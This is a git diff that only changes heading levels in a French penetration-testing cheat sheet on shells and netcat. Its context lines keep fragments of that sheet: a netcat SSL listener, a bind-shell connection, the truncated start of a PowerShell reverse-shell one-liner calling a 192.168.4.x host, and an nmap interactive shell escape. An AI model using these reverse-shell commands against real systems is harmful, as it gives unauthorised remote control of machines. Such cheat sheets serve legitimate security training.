@@ -1,6 +1,6 @@
-## <span style="color:orange;">5. Shells & Netcat</span>
+# <span style="color:orange;">5. Shells & Netcat</span>
 
-### 5.1 Reverse Shell - Listener
+## 5.1 Reverse Shell - Listener
 
 **Écouter sur port 9090 :**
 
@@ -26,7 +26,7 @@ ncat -vlp 9090 --ssl  # SSL reverse shell
 
 ---
 
-### 5.2 Bind Shell - Connexion
+## 5.2 Bind Shell - Connexion
 
 **Se connecter à bind shell :**
 
@@ -42,7 +42,7 @@ netcat enum-sandbox 9999
 
 ---
 
-### 5.3 Reverse Shells - Payloads Courants
+## 5.3 Reverse Shells - Payloads Courants
 
 **Bash :**
 
@@ -116,7 +116,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.4
 
 ---
 
-### 5.4 Upgrade Shell (TTY)
+## 5.4 Upgrade Shell (TTY)
 
 **Une fois shell obtenu, upgrade vers TTY interactif :**
 
@@ -163,7 +163,7 @@ nmap --interactive
 
 ---
 
-### 5.5 Commandes Shell Utiles
+## 5.5 Commandes Shell Utiles
 
 **Une fois shell obtenu :**
 
